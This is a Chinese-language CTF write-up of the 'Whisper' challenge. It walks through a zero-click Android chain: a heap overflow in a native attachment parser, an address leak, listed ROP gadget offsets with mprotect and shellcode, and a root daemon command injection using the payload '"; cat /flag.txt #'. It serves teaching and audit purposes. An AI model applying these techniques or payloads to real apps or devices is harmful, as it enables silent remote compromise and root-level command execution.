# Whisper

## 题目简述

Whisper 是一道 Android 零点击原生利用题。系统由消息后端、Android Whisper 应用、受害者模拟器和定制系统镜像组成。攻击者只能作为普通用户向受害者发送消息，但应用会在后台自动下载并解析附件以生成预览，因此受害者不需要打开会话或点击文件。

附件预览支持多种类型：

```text
imgcard       -> libwhisperimg.so
stickercard   -> libwhispersticker.so
pollcard      -> libwhisperpoll.so
rcard         -> libwhispermedia.so
voicecard     -> libwhispervoice.so
fxcard        -> libwhisperfx.so
```

其中大部分库是干扰项，真正的内存破坏位于 `rcard` 对应的 `libwhispermedia.so`。成功控制应用进程后，还要连接仅允许 Whisper 应用 UID 访问的 root 守护进程 `/dev/socket/whisperd`，通过命令注入读取 root-only 的 `/flag.txt`。

虽然题目载体是 APK，也涉及 Android 应用 UID 和本地 socket，但决定性主障碍是 native 堆越界、函数指针劫持和 ROP，所以归入 pwn，而不是仅按平台归入 mobile。

## 解题过程

### 1. 找到零点击输入与回显通道

攻击者注册账号，与平台分配的 victim 建立会话并上传附件。victim 应用在线时会自动处理附件，而不是等用户打开消息。

预览解析器返回的标题和副标题随后会被应用发回消息后端，同一会话中的攻击者可通过 WebSocket 收到结果。因此这一预览机制同时提供：

- 零点击文件解析入口；
- ASLR 地址泄漏回显；
- 最终 flag 的数据外带通道。

这也解释了为什么不需要让 shellcode直接访问外网；victim 的部署层还设置了出站防火墙，只允许后端等必要地址。

### 2. 理解 `rcard` 格式与越界写

`rcard` 的核心格式为：

```text
"RCRD" | u16 version | u32 field_count | fields... | trailer

field = u8 tag | u16 length | data[length]
```

解析器根据 `field_count` 逐项写入堆上的字段表，每项占 16 字节，但没有正确约束字段数量。在同一块对象的后部，程序还保存了一个带函数指针的分派结构。字段项持续写出预定数组边界后，便会覆盖该结构。

最终调用路径可抽象为：

```c
rdi = *(base + 0x118);
call *(rdi + 0x10);
```

构造 18 个字段时，第 17 号字段可以覆盖 `base + 0x118`，使其指向该字段自己的可控数据；`[rdi + 0x10]` 也随之可控。由此得到：

```text
RDI 指向攻击者字段缓冲区
RIP 跳转到攻击者指定地址
```

### 3. 先用 trailer 泄漏库基址

直接劫持函数指针还不够，因为 `libwhispermedia.so` 是 PIE。解析器另有一条特殊 trailer 路径：

```text
u32 magic = 0xc0ffee5e
qword marker = "WREKLAEF"
```

满足该条件时，格式化逻辑会取出 `base + 0x130` 处保存的内部 formatter 函数地址，使用固定值异或后放入预览副标题。该函数相对库基址的偏移为：

```text
formatter = libwhispermedia_base + 0x1d780
```

泄漏卡片可以按下面的关键条件构造：

```text
field_count = 17
field #16: tag = 8, length = 0
trailer = 0xc0ffee5e || "WREKLAEF"
```

从 WebSocket 收到副标题后解码：

```python
leaked_formatter = encoded_subtitle ^ 0xa7c39e15b6428d7f
media_base = leaked_formatter - 0x1d780
```

因此远程利用通常分为两次发送：第一张卡片泄漏基址，第二张卡片完成控制流劫持。

### 4. 以字段缓冲区作为 ROP 栈

库中存在适合题目利用的 gadget 区域，其中最关键的是：

```text
0x1dda0 / 0x1f400  mov rsp, rdi ; ret
0x1f404            pop rdi ; ret
0x1f40a            pop rsi ; ret
0x1f40c            pop rax ; ret
0x1f40e            pop rcx ; ret
0x1f415            mov rax, [rax] ; ret
0x1f419            add rax, rcx ; ret
0x1f424            jmp rax
0x1f42a            mov [rdi], rax ; ret
0x33061            mov edx, eax ; ret
```

把被覆盖的函数指针设置为：

```text
libwhispermedia_base + 0x1dda0
```

调用时 `rdi` 已指向第 17 号字段缓冲区，`mov rsp, rdi ; ret` 因而把附件内容直接转成 ROP 栈。

ROP 链完成三件事：

1. 把下一阶段 shellcode 写入 `libwhispermedia.so` 的 `.bss`；
2. 以 `calloc@GOT` 为已知锚点，按 libc 内符号差值解析 `mprotect`；
3. 调用 `mprotect` 给 `.bss` 增加执行权限，再跳入 shellcode。

APK 同时包含 x86_64 与 arm64-v8a 版本的 `libwhispermedia.so`。远程 victim 架构与 exploit 中的 gadget、GOT 和 `.bss` 偏移必须匹配，不能把两个 ABI 的常量混用。

### 5. 从应用进程连接 root 守护进程

定制 Android 镜像中存在 root 守护进程：

```text
/dev/socket/whisperd
```

`whisperd` 会检查对端进程 UID，只有 Whisper 应用 UID 能使用其诊断接口。外部普通应用无法直接连接，但此时 shellcode 就运行在合法 Whisper 进程中，所以能够通过检查。

协议结构为：

```text
u32 opcode = 1
u32 tag_len
tag bytes
u32 detail_len
detail bytes
```

守护进程随后把 tag 和 detail 拼进 shell 命令：

```sh
echo "diag[<tag>]: <detail>" >> /data/local/tmp/whisper_diag.log 2>/dev/null; \
getprop | grep -i "<tag>" 2>/dev/null | head -n 20
```

本地仓库中的 `whisperd` 二进制可直接找到 `/dev/socket/whisperd`、`WHISPERD_APP_UID`、日志路径和上述格式串，说明 UID 限制与命令拼接都属于实际部署逻辑。

tag 被放入双引号却没有转义，可以发送：

```text
"; cat /flag.txt #
```

拼接后，前一个引号被闭合，root 权限的 `whisperd` 会执行：

```sh
cat /flag.txt
```

并把标准输出通过 socket 返回给应用进程。

### 6. 借预览结果回传 flag

shellcode 收到 `whisperd` 响应后，不必额外建立外连，而是把结果写入当前 native 解析结果的标题或副标题。解析函数正常返回，Whisper 应用将预览上传到后端，攻击者再从会话 WebSocket 中接收它。

完整链条如下：

```text
上传泄漏 rcard
  -> victim 自动解析
  -> 特殊 trailer 泄漏 libwhispermedia 基址
  -> 上传利用 rcard
  -> 字段表越界覆盖分派指针
  -> 栈迁移、ROP、mprotect 与 shellcode
  -> 以合法应用 UID 连接 /dev/socket/whisperd
  -> tag 命令注入
  -> root 执行 cat /flag.txt
  -> 写回预览标题
  -> 后端 WebSocket 把 flag 送回攻击者
```

公开复现得到的动态 flag 为：

```text
r3ctf{WhISPer-W@_0T0-Mo_n@kU_TOd0Ku_mONo_D@_Yo-t4Pl3S51y_zero_interaction_de_shinnyuu_dekita_ne_congrats0}
```

与具体 APK 构建绑定的完整 `rcard` 生成、ROP 常量和 WebSocket 发送代码可参考公开题解：[hax1ng 的 Whisper writeup](https://github.com/hax1ng/r3ctf-2026-writeups/blob/master/pwn/Whisper.md)。题目的输入面、两阶段利用、UID 边界与 flag 回传逻辑均已在正文中说明，外链用于保留可执行 exploit 的实现细节。

## 方法总结

本题的关键不是某个单独漏洞，而是把四个权限层次串成一条无需交互的链：

1. 消息后端使攻击者能够向 victim 投递附件；
2. 自动预览把不可信附件送入 native 解析器；
3. 堆越界和 ROP 使代码运行在 Whisper 应用 UID 下；
4. 应用 UID 又恰好被 root 守护进程信任，未转义的 tag 最终变成 root 命令注入。

审计类似应用时，应同时追踪“输入是否自动解析”“解析结果是否可回显”“native 对象中数据区和函数指针是否相邻”以及“本地高权限服务如何验证调用者”。平台 UID 检查本身没有被伪造，而是被前一阶段原生利用合法继承；这类组合漏洞往往比单看 APK 导出组件或单看某个 `.so` 更容易漏掉。
